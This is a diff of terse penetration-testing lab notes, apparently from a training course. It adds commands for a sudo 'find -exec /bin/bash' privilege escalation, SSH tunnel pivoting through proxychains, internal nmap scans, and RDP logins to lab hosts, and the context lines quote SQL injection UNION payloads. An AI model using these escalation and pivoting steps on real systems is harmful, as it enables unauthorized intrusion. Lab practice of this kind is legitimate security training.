@@ -131,7 +131,26 @@ first target: given to us. Scan, 22 and 80 open, firefox, directory traversal=us
 UNION SELECT x,x,x (order matters), ?product=7 UNION select 1,2,3
 golden statement 
 .181 is vulnerable to sql injection, not worried about pswd, edit goldent statement, AARON!, dont need access -> move on to .172, 
-student@lin-ops:~$ ssh -MS /tmp/jump2 Aaron@127.0.0.1 -p 5454 (port that we opened on the 172), (aaron password)look around: sudo -l, ls, enumerate etc. User can usrbin/find. Gtfo bins!, Aaron@RoundSensor:/$ sudo find . -exec /bin/bash \; -quit, 
+student@lin-ops:~$ ssh -MS /tmp/jump2 Aaron@127.0.0.1 -p 5454 (port that we opened on the 172), (aaron password)look around: sudo -l, ls, enumerate etc. User can usrbin/find. Gtfo bins!, 
+Aaron@RoundSensor:/$ sudo find . -exec /bin/bash \; -quit, 
+ip n
+ip ad
+ping sweep***
+
+student@lin-ops:~$ ssh -S /tmp/jump jump -O cancel -D 9050
+student@lin-ops:~$ ssh -S /tmp/jump2 jump2 -O forward -D 9050
+student@lin-ops:~$ proxychains nmap -Pn -T4 -vvvv 192.168.28.179,203 
+student@lin-ops:~$ proxcychains nc 192.168.28.179 9999
+/ student@lin-ops:~$ proxychains xfreerdp /u:user2 /v:192.168.28.179
+student@lin-ops:~$ ssh -S /tmp/jump2 jump2 -O forward -L 8888:192.168.28.179:3389
+student@lin-ops:~$ xfreerdp /u:user2 /v:127.0.0.1:8888
+student@lin-ops:~$ rm .config/freerdp/known_hosts 
+**student@lin-ops:~$ xfreerdp /u:Lroth /v:127.0.0.1:8888
+boom
+
+
+
+
 
 
 JATE - 10.50.35.123
